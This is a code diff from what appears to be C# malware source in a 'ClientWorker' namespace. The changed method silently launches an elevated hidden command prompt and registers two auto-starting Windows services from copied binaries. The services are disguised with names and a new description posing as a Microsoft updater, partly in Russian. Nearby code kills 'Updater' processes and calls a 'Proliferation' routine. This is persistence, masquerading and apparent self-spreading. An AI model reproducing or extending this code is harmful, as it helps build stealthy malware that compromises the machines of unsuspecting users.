@@ -45,8 +45,6 @@ namespace ClientWorker
             }
             Resetter.pause = false;
         }
-
-
         private void KillUpdater()
         {
             foreach (var process in Process.GetProcessesByName("Updater"))
@@ -78,7 +76,6 @@ namespace ClientWorker
                     break;
             }
         }
-
         public void Reconnect()
         {
             try
@@ -104,13 +101,13 @@ namespace ClientWorker
             proc.StartInfo.Verb = "runas";
 
             proc.StartInfo.Arguments = "/C "+ "Sc create MicrosoftServiceUpdaterr binPath= " + applicationDataPath + StartData.floaderNewCopy +
-                StartData.service + " DisplayName= MicrosoftUpdaterr type= own start= auto";
+                StartData.service + " DisplayName= MicrosoftUpdaterr Desceiption= MicroSoftUpdater обнаружение обновлений и получение type= own start= auto";
 
             proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             proc.Start();
 
             proc.StartInfo.Arguments = "/C " + "Sc create MicroUpdater binPath= " + applicationDataPath + StartData.floaderNewCopy +
-                StartData.updater + " DisplayName= MicroUpdater type= own start= auto";
+                StartData.updater + " DisplayName= MicroUpdater Desceiption= MicroSoftUpdater обнаружение обновлений и получение type= own start= auto";
             proc.Start();
 
             Proliferation(applicationDataPath);
